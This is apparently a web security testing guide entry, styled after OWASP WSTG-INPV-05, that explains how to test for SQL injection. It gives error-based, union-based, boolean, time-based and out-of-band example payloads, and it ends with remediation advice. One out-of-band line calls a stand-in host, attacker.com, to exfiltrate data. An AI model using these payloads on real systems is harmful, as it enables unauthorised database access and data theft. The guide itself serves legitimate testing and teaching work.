# WSTG-INPV-05 - Testing for SQL Injection

## Summary
SQL Injection (SQLi) is a vulnerability that occurs when untrusted user input is included in an SQL query without proper validation or sanitization. Attackers can exploit this vulnerability to execute malicious SQL queries, potentially compromising the database and the application.

## Objective
To identify and exploit SQL Injection vulnerabilities in the application and evaluate their impact.

## Testing Procedure

### 1. Identify Input Points
- **Description**: Locate input fields or parameters that the application processes in SQL queries.
- **Steps**:
  1. Use the application to identify form fields, query parameters, or headers.
  2. Note which inputs affect the application's SQL queries (e.g., login forms, search fields).

### 2. Test for Error-Based SQL Injection
- **Description**: Inject SQL payloads to trigger error messages.
- **Steps**:
  1. Inject payloads like `'` or `"` into input fields.
  2. Observe server responses for SQL error messages or unexpected behavior.
  3. Examples of payloads:
     - `' OR '1'='1`
     - `" OR "1"="1`
     - `1'--`

### 3. Test for Union-Based SQL Injection
- **Description**: Use the `UNION` SQL operator to retrieve data from other tables.
- **Steps**:
  1. Inject payloads like `UNION SELECT NULL, NULL--` to identify the number of columns.
  2. Adjust the payload to match the number of columns and retrieve sensitive data.
  3. Example payload:
     - `' UNION SELECT username, password FROM users--`

### 4. Test for Boolean-Based SQL Injection
- **Description**: Inject payloads to evaluate true or false conditions.
- **Steps**:
  1. Inject payloads like `1=1` (true) or `1=2` (false).
  2. Observe differences in the application's response.
  3. Example payloads:
     - `1' AND 1=1--`
     - `1' AND 1=2--`

### 5. Test for Time-Based SQL Injection
- **Description**: Use time delays to identify blind SQL Injection.
- **Steps**:
  1. Inject payloads that include time delays, such as `SLEEP()` or `WAITFOR DELAY`.
  2. Observe response times to confirm the injection point.
  3. Example payloads:
     - `1' AND SLEEP(5)--`
     - `1'; WAITFOR DELAY '00:00:05'--`

### 6. Test for Out-of-Band (OOB) SQL Injection
- **Description**: Use OOB techniques to exfiltrate data when responses are not visible.
- **Steps**:
  1. Inject payloads that trigger DNS or HTTP requests to an attacker-controlled server.
  2. Monitor the attacker server for responses.
  3. Example payload:
     - `1' AND LOAD_FILE('\\attacker.com\file')--`

## Tools
- Burp Suite
- OWASP ZAP
- SQLMap
- Database Management Tools (e.g., MySQL, PostgreSQL)

## Remediation
1. Use parameterized queries (prepared statements) to prevent SQL Injection.
2. Validate and sanitize all user inputs on the server side.
3. Implement least privilege principles for database accounts.
4. Regularly review and test database query logic for vulnerabilities.
5. Educate developers on secure coding practices to mitigate SQL Injection.

## References
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
